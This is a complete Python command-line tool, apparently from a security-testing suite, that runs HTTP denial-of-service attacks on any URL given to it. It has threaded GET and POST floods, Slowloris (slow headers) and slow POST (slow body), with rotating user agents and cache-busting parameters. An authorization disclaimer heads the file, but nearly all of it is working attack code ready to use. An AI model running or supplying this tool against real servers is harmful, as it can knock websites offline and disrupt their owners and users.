#!/usr/bin/env python3
"""
HTTP DoS Attack Simulation

This module provides a class-based implementation for simulating HTTP-based Denial of Service
attacks against web servers. It supports multiple attack techniques including HTTP flooding,
slow HTTP headers (Slowloris), and slow HTTP POST (slow body).

The module supports various features:
- Multiple attack methods (GET flood, POST flood, Slowloris, Slow POST)
- Concurrent connections using threading
- Customizable request headers and payloads
- Connection keep-alive and timeout configuration
- Detailed logging and statistics
- Performance monitoring

IMPORTANT ETHICAL AND LEGAL NOTICE:
This tool should ONLY be used for legitimate security testing with proper authorization.
Unauthorized use against systems without explicit permission is illegal and unethical.
The authors assume no liability for misuse of this software.

Usage Examples:
    # Basic HTTP GET flood
    python http_dos.py -t http://example.com -m get -c 100
    
    # Slowloris attack with 200 connections
    python http_dos.py -t http://example.com -m slowloris -c 200
    
    # Slow POST attack with custom timeout
    python http_dos.py -t http://example.com -m slowpost -c 50 -d 30

Author: Montimage
License: Proprietary
Version: 1.0.0
"""

import os
import sys
import time
import random
import socket
import argparse
import threading
import urllib.parse
from typing import List, Dict, Optional, Any, Tuple, Union, Set

# Add parent directory to path to import logger
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
try:
    from logger import get_logger
except ImportError:
    # Fallback logging if the centralized logger is not available
    import logging
    def get_logger(name):
        logger = logging.getLogger(name)
        if not logger.handlers:
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            logger.addHandler(handler)
            logger.setLevel(logging.INFO)
        return logger

# Get logger for this module
logger = get_logger(__name__)

# Import required libraries with error handling
try:
    import requests
    from requests.exceptions import RequestException
except ImportError:
    logger.error("This script requires the requests library.")
    logger.error("Install it using: pip install requests")
    sys.exit(1)


class HTTPDoSAttack:
    """
    A class to perform HTTP-based DoS attack simulations for security testing.
    
    This class provides methods to execute different types of HTTP DoS attacks
    including GET floods, POST floods, Slowloris, and Slow POST attacks.
    
    Attributes:
        target_url (str): URL of the target web server
        attack_method (str): Method of attack (get, post, slowloris, slowpost)
        num_connections (int): Number of concurrent connections
        duration (int): Duration of the attack in seconds
        timeout (int): Connection timeout in seconds
        user_agents (List[str]): List of user agent strings to use
        verbose (bool): Whether to enable verbose output
    """
    
    # Attack methods
    ATTACK_METHODS = ['get', 'post', 'slowloris', 'slowpost']
    
    # Common user agents for disguising requests
    DEFAULT_USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
    ]
    
    def __init__(self, 
                 target_url: str, 
                 attack_method: str = 'get',
                 num_connections: int = 100,
                 duration: int = 60,
                 timeout: int = 10,
                 user_agents: Optional[List[str]] = None,
                 verbose: bool = False):
        """
        Initialize the HTTP DoS attack simulator.
        
        Args:
            target_url (str): URL of the target web server
            attack_method (str, optional): Method of attack. Defaults to 'get'.
            num_connections (int, optional): Number of concurrent connections. Defaults to 100.
            duration (int, optional): Duration of the attack in seconds. Defaults to 60.
            timeout (int, optional): Connection timeout in seconds. Defaults to 10.
            user_agents (List[str], optional): List of user agent strings. Defaults to None.
            verbose (bool, optional): Whether to enable verbose output. Defaults to False.
            
        Raises:
            ValueError: If attack_method is not supported
            ValueError: If target_url is not a valid URL
        """
        # Validate attack method
        attack_method = attack_method.lower()
        if attack_method not in self.ATTACK_METHODS:
            raise ValueError(f"Unsupported attack method: {attack_method}. Supported methods: {', '.join(self.ATTACK_METHODS)}")
        self.attack_method = attack_method
        
        # Validate and parse URL
        try:
            parsed_url = urllib.parse.urlparse(target_url)
            if not parsed_url.scheme or not parsed_url.netloc:
                raise ValueError("Invalid URL format")
            self.target_url = target_url
            self.host = parsed_url.netloc
            self.path = parsed_url.path if parsed_url.path else "/"
            self.ssl = parsed_url.scheme == "https"
            self.port = parsed_url.port or (443 if self.ssl else 80)
        except Exception as e:
            raise ValueError(f"Invalid target URL: {target_url}. Error: {str(e)}")
        
        # Set other parameters
        self.num_connections = max(1, min(num_connections, 1000))  # Limit connections to reasonable range
        self.duration = max(1, duration)  # Ensure positive duration
        self.timeout = max(1, timeout)  # Ensure positive timeout
        self.user_agents = user_agents or self.DEFAULT_USER_AGENTS
        self.verbose = verbose
        
        # Initialize state variables
        self.running = False
        self.start_time = None
        self.end_time = None
        self.active_connections = 0
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.bytes_sent = 0
        self.bytes_received = 0
        self.stop_event = threading.Event()
        self.lock = threading.Lock()
        
        logger.info(f"Initialized HTTP DoS attack simulation")
        logger.info(f"Target: {target_url}")
        logger.info(f"Attack method: {attack_method}")
        if self.verbose:
            logger.info(f"Connections: {num_connections}, Duration: {duration}s, Timeout: {timeout}s")
    
    def _get_random_user_agent(self) -> str:
        """
        Get a random user agent string.
        
        Returns:
            str: Random user agent string
        """
        return random.choice(self.user_agents)
    
    def _get_random_params(self) -> Dict[str, str]:
        """
        Generate random URL parameters to bypass caching.
        
        Returns:
            Dict[str, str]: Dictionary of random parameters
        """
        return {
            f"param{random.randint(1, 1000)}": f"value{random.randint(1, 1000)}",
            "nocache": str(time.time())
        }
    
    def _get_random_data(self, size: int = 1000) -> str:
        """
        Generate random POST data.
        
        Args:
            size (int, optional): Size of data in bytes. Defaults to 1000.
            
        Returns:
            str: Random data string
        """
        return "data=" + "X" * size
    
    def _update_stats(self, success: bool, sent: int = 0, received: int = 0) -> None:
        """
        Update attack statistics.
        
        Args:
            success (bool): Whether the request was successful
            sent (int, optional): Bytes sent. Defaults to 0.
            received (int, optional): Bytes received. Defaults to 0.
        """
        with self.lock:
            self.total_requests += 1
            if success:
                self.successful_requests += 1
            else:
                self.failed_requests += 1
            self.bytes_sent += sent
            self.bytes_received += received
    
    def _get_flood(self, thread_id: int) -> None:
        """
        Execute a GET flood attack.
        
        Args:
            thread_id (int): Thread identifier
        """
        session = requests.Session()
        
        while not self.stop_event.is_set():
            try:
                with self.lock:
                    self.active_connections += 1
                
                # Prepare request with random parameters to bypass cache
                headers = {"User-Agent": self._get_random_user_agent()}
                params = self._get_random_params()
                
                # Send request
                start_time = time.time()
                response = session.get(
                    self.target_url,
                    params=params,
                    headers=headers,
                    timeout=self.timeout,
                    allow_redirects=False
                )
                
                # Calculate bytes
                request_size = len(str(headers)) + sum(len(k) + len(v) for k, v in params.items())
                response_size = len(response.content)
                
                # Update statistics
                self._update_stats(True, request_size, response_size)
                
                if self.verbose:
                    logger.debug(f"Thread {thread_id}: GET request successful, status {response.status_code}")
                
            except RequestException as e:
                self._update_stats(False)
                if self.verbose:
                    logger.debug(f"Thread {thread_id}: GET request failed: {str(e)}")
            except Exception as e:
                self._update_stats(False)
                logger.error(f"Thread {thread_id}: Unexpected error: {str(e)}")
            finally:
                with self.lock:
                    self.active_connections -= 1
    
    def _post_flood(self, thread_id: int) -> None:
        """
        Execute a POST flood attack.
        
        Args:
            thread_id (int): Thread identifier
        """
        session = requests.Session()
        
        while not self.stop_event.is_set():
            try:
                with self.lock:
                    self.active_connections += 1
                
                # Prepare request
                headers = {
                    "User-Agent": self._get_random_user_agent(),
                    "Content-Type": "application/x-www-form-urlencoded"
                }
                data = self._get_random_data()
                
                # Send request
                response = session.post(
                    self.target_url,
                    data=data,
                    headers=headers,
                    timeout=self.timeout,
                    allow_redirects=False
                )
                
                # Calculate bytes
                request_size = len(str(headers)) + len(data)
                response_size = len(response.content)
                
                # Update statistics
                self._update_stats(True, request_size, response_size)
                
                if self.verbose:
                    logger.debug(f"Thread {thread_id}: POST request successful, status {response.status_code}")
                
            except RequestException as e:
                self._update_stats(False)
                if self.verbose:
                    logger.debug(f"Thread {thread_id}: POST request failed: {str(e)}")
            except Exception as e:
                self._update_stats(False)
                logger.error(f"Thread {thread_id}: Unexpected error: {str(e)}")
            finally:
                with self.lock:
                    self.active_connections -= 1
    
    def _slowloris(self, thread_id: int) -> None:
        """
        Execute a Slowloris attack (slow HTTP headers).
        
        Args:
            thread_id (int): Thread identifier
        """
        sockets = []
        
        # Create connections
        for _ in range(5):  # Each thread manages multiple sockets
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(self.timeout)
                
                # Connect to target
                s.connect((self.host, self.port))
                
                # Send partial HTTP request
                s.send(f"GET {self.path} HTTP/1.1\r\n".encode())
                s.send(f"Host: {self.host}\r\n".encode())
                s.send(f"User-Agent: {self._get_random_user_agent()}\r\n".encode())
                
                # Add socket to list
                sockets.append(s)
                
                with self.lock:
                    self.active_connections += 1
                    self.bytes_sent += 100  # Approximate bytes sent
                
                if self.verbose:
                    logger.debug(f"Thread {thread_id}: Opened new Slowloris connection")
                
            except Exception as e:
                if self.verbose:
                    logger.debug(f"Thread {thread_id}: Failed to open connection: {str(e)}")
        
        # Keep connections alive
        while not self.stop_event.is_set() and sockets:
            for i, s in enumerate(list(sockets)):
                try:
                    # Send incomplete header line to keep connection open
                    s.send(f"X-Header-{random.randint(1, 1000)}: {random.randint(1, 1000)}\r\n".encode())
                    
                    with self.lock:
                        self.total_requests += 1
                        self.successful_requests += 1
                        self.bytes_sent += 30  # Approximate bytes sent
                    
                    if self.verbose:
                        logger.debug(f"Thread {thread_id}: Sent keep-alive data to connection {i}")
                    
                except Exception as e:
                    # Remove failed socket
                    sockets.remove(s)
                    try:
                        s.close()
                    except:
                        pass
                    
                    with self.lock:
                        self.active_connections -= 1
                        self.failed_requests += 1
                    
                    if self.verbose:
                        logger.debug(f"Thread {thread_id}: Connection {i} closed: {str(e)}")
            
            # Sleep before next round
            time.sleep(15)  # Standard web server timeout is usually 30-60 seconds
    
    def _slow_post(self, thread_id: int) -> None:
        """
        Execute a Slow POST attack (slow HTTP body).
        
        Args:
            thread_id (int): Thread identifier
        """
        sockets = []
        
        # Create connections
        for _ in range(5):  # Each thread manages multiple sockets
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(self.timeout)
                
                # Connect to target
                s.connect((self.host, self.port))
                
                # Calculate content length (large)
                content_length = 1000000  # 1MB
                
                # Send HTTP headers
                s.send(f"POST {self.path} HTTP/1.1\r\n".encode())
                s.send(f"Host: {self.host}\r\n".encode())
                s.send(f"User-Agent: {self._get_random_user_agent()}\r\n".encode())
                s.send(f"Content-Type: application/x-www-form-urlencoded\r\n".encode())
                s.send(f"Content-Length: {content_length}\r\n\r\n".encode())
                
                # Start sending body data
                s.send("data=".encode())
                
                # Add socket to list
                sockets.append(s)
                
                with self.lock:
                    self.active_connections += 1
                    self.bytes_sent += 200  # Approximate bytes sent
                
                if self.verbose:
                    logger.debug(f"Thread {thread_id}: Opened new Slow POST connection")
                
            except Exception as e:
                if self.verbose:
                    logger.debug(f"Thread {thread_id}: Failed to open connection: {str(e)}")
        
        # Keep connections alive
        while not self.stop_event.is_set() and sockets:
            for i, s in enumerate(list(sockets)):
                try:
                    # Send small chunk of POST body
                    s.send("X".encode())
                    
                    with self.lock:
                        self.total_requests += 1
                        self.successful_requests += 1
                        self.bytes_sent += 1
                    
                    if self.verbose:
                        logger.debug(f"Thread {thread_id}: Sent data chunk to connection {i}")
                    
                except Exception as e:
                    # Remove failed socket
                    sockets.remove(s)
                    try:
                        s.close()
                    except:
                        pass
                    
                    with self.lock:
                        self.active_connections -= 1
                        self.failed_requests += 1
                    
                    if self.verbose:
                        logger.debug(f"Thread {thread_id}: Connection {i} closed: {str(e)}")
            
            # Sleep before next chunk
            time.sleep(5)
    
    def execute(self) -> Dict[str, Any]:
        """
        Execute the HTTP DoS attack.
        
        Returns:
            Dict[str, Any]: Statistics about the attack execution
        """
        logger.info(f"Starting HTTP DoS attack against {self.target_url}")
        logger.info(f"Attack method: {self.attack_method}, Connections: {self.num_connections}")
        logger.info(f"Duration: {self.duration} seconds")
        
        self.running = True
        self.start_time = time.time()
        self.stop_event.clear()
        
        # Create and start worker threads
        threads = []
        
        try:
            # Choose attack method
            if self.attack_method == 'get':
                worker_method = self._get_flood
                logger.info("Using HTTP GET flood attack method")
            elif self.attack_method == 'post':
                worker_method = self._post_flood
                logger.info("Using HTTP POST flood attack method")
            elif self.attack_method == 'slowloris':
                worker_method = self._slowloris
                logger.info("Using Slowloris (slow headers) attack method")
            elif self.attack_method == 'slowpost':
                worker_method = self._slow_post
                logger.info("Using Slow POST (slow body) attack method")
            
            # Start worker threads
            for i in range(self.num_connections):
                thread = threading.Thread(target=worker_method, args=(i,))
                thread.daemon = True
                thread.start()
                threads.append(thread)
                
                # Start threads gradually to avoid overwhelming the local system
                if i % 10 == 0:
                    time.sleep(0.1)
            
            logger.info(f"Started {len(threads)} attack threads")
            
            # Progress reporting
            start_time = time.time()
            while time.time() - start_time < self.duration and not self.stop_event.is_set():
                elapsed = time.time() - start_time
                progress = (elapsed / self.duration) * 100
                
                # Report statistics every 5 seconds
                if int(elapsed) % 5 == 0:
                    with self.lock:
                        logger.info(f"Progress: {progress:.1f}%, Active connections: {self.active_connections}, "
                                   f"Requests: {self.total_requests}")
                
                time.sleep(1)
            
            # Signal threads to stop
            logger.info("Attack duration reached, stopping threads...")
            self.stop_event.set()
            
            # Wait for threads to finish (with timeout)
            for thread in threads:
                thread.join(timeout=2)
            
            logger.info("HTTP DoS attack completed successfully")
            
        except KeyboardInterrupt:
            logger.warning("Attack interrupted by user")
            self.stop_event.set()
        except Exception as e:
            logger.error(f"Error during attack: {str(e)}")
        finally:
            self.end_time = time.time()
            stats = self._get_statistics()
            self._print_summary(stats)
            return stats
    
    def _get_statistics(self) -> Dict[str, Any]:
        """
        Get statistics about the attack execution.
        
        Returns:
            Dict[str, Any]: Statistics including requests sent, success rate, etc.
        """
        end_time = self.end_time or time.time()
        start_time = self.start_time or end_time
        duration = end_time - start_time
        
        # Calculate rates
        requests_per_second = self.total_requests / duration if duration > 0 else 0
        bytes_sent_per_second = self.bytes_sent / duration if duration > 0 else 0
        bytes_received_per_second = self.bytes_received / duration if duration > 0 else 0
        
        # Calculate success rate
        success_rate = (self.successful_requests / self.total_requests * 100) if self.total_requests > 0 else 0
        
        return {
            "target_url": self.target_url,
            "attack_method": self.attack_method,
            "duration_seconds": duration,
            "configured_connections": self.num_connections,
            "active_connections": self.active_connections,
            "total_requests": self.total_requests,
            "successful_requests": self.successful_requests,
            "failed_requests": self.failed_requests,
            "success_rate_percent": success_rate,
            "requests_per_second": requests_per_second,
            "bytes_sent": self.bytes_sent,
            "bytes_received": self.bytes_received,
            "bytes_sent_per_second": bytes_sent_per_second,
            "bytes_received_per_second": bytes_received_per_second
        }
    
    def _print_summary(self, stats: Dict[str, Any]) -> None:
        """
        Print a summary of the attack execution.
        
        Args:
            stats (Dict[str, Any]): Statistics from _get_statistics()
        """
        logger.info("=" * 50)
        logger.info("HTTP DoS Attack Summary")
        logger.info("=" * 50)
        logger.info(f"Target: {stats['target_url']}")
        logger.info(f"Attack method: {stats['attack_method']}")
        logger.info(f"Duration: {stats['duration_seconds']:.2f} seconds")
        logger.info(f"Configured connections: {stats['configured_connections']}")
        logger.info(f"Active connections at end: {stats['active_connections']}")
        logger.info(f"Total requests: {stats['total_requests']}")
        logger.info(f"Successful requests: {stats['successful_requests']}")
        logger.info(f"Failed requests: {stats['failed_requests']}")
        logger.info(f"Success rate: {stats['success_rate_percent']:.2f}%")
        logger.info(f"Request rate: {stats['requests_per_second']:.2f} requests/second")
        logger.info(f"Data sent: {stats['bytes_sent']/1024:.2f} KB ({stats['bytes_sent_per_second']/1024:.2f} KB/s)")
        logger.info(f"Data received: {stats['bytes_received']/1024:.2f} KB ({stats['bytes_received_per_second']/1024:.2f} KB/s)")
        logger.info("=" * 50)


def parse_arguments() -> argparse.Namespace:
    """
    Parse command-line arguments for the HTTP DoS attack.
    
    Returns:
        argparse.Namespace: The parsed command-line arguments
    """
    parser = argparse.ArgumentParser(
        description="HTTP DoS Attack Simulation Tool",
        epilog="IMPORTANT: Use only for authorized security testing."
    )
    
    # Required arguments
    parser.add_argument(
        "-t", "--target",
        dest="target_url",
        required=True,
        help="URL of the target web server"
    )
    
    # Optional arguments
    parser.add_argument(
        "-m", "--method",
        dest="attack_method",
        choices=HTTPDoSAttack.ATTACK_METHODS,
        default="get",
        help="Attack method (default: get)"
    )
    
    parser.add_argument(
        "-c", "--connections",
        dest="num_connections",
        type=int,
        default=100,
        help="Number of concurrent connections (default: 100)"
    )
    
    parser.add_argument(
        "-d", "--duration",
        dest="duration",
        type=int,
        default=60,
        help="Duration of the attack in seconds (default: 60)"
    )
    
    parser.add_argument(
        "-o", "--timeout",
        dest="timeout",
        type=int,
        default=10,
        help="Connection timeout in seconds (default: 10)"
    )
    
    parser.add_argument(
        "-v", "--verbose",
        dest="verbose",
        action="store_true",
        help="Enable verbose output"
    )
    
    return parser.parse_args()


def main() -> None:
    """
    Main entry point for the HTTP DoS attack simulation.
    """
    # Display ethical notice
    print("=" * 80)
    print("WARNING: This tool is for AUTHORIZED SECURITY TESTING ONLY")
    print("Using this tool against systems without permission is ILLEGAL")
    print("The authors assume NO LIABILITY for misuse of this software")
    print("=" * 80)
    print()
    
    try:
        # Parse command-line arguments
        args = parse_arguments()
        
        # Create and execute the attack
        attack = HTTPDoSAttack(
            target_url=args.target_url,
            attack_method=args.attack_method,
            num_connections=args.num_connections,
            duration=args.duration,
            timeout=args.timeout,
            verbose=args.verbose
        )
        
        # Execute the attack
        attack.execute()
        
    except KeyboardInterrupt:
        print("\nAttack simulation interrupted by user")
        sys.exit(0)
        
    except Exception as e:
        logger.error(f"Unhandled error: {str(e)}")
        sys.exit(1)


if __name__ == "__main__":
    main()
